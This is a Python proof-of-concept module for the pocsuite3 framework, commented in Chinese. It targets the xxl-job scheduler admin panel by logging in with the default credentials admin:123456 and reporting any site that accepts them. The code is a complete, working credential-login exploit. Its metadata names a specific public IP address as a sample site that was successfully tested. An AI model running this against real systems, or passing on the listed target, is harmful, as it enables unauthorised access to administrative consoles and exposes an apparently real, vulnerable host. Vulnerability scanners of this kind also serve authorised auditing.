from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XXLJOBPOC(POCBase):
    vulID = "99032"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "19dl"  # PoC作者的大名
    vulDate = "2021-10-16"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-13"  # 编写 PoC 的日期
    updateDate = "2022-07-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job"]  # 漏洞地址来源,0day不用写
    name = "xxl-job 后台弱口令 PoC"  # PoC 名称
    appPowerLink = "https://github.com/xuxueli/xxl-job"  # 漏洞厂商主页地址
    appName = "xxl-job"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://121.40.156.64:8080"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ["requests"]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                xxl-job后台存在默认口令，攻击者可以通过默认口令登录到后台，浏览敏感信息或进行敏感操作
            """  # 漏洞简要描述
    pocDesc = """
                admin:123456
            """  # POC用法描述

    def _check(self):
        result = []
        full_url = f"{self.url}/login"
        data = {"userName": "admin", "password": "123456"}

        try:
            response = requests.post(full_url, data=data, allow_redirects=False, verify=False, timeout=5)
            # dic = response.json()

            data_dict = response.json()
            # 判断是否存在漏洞
            if data_dict.get("code") == 200 and data_dict.get("msg") == None:
                result.append(self.url)

        except Exception as e:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)
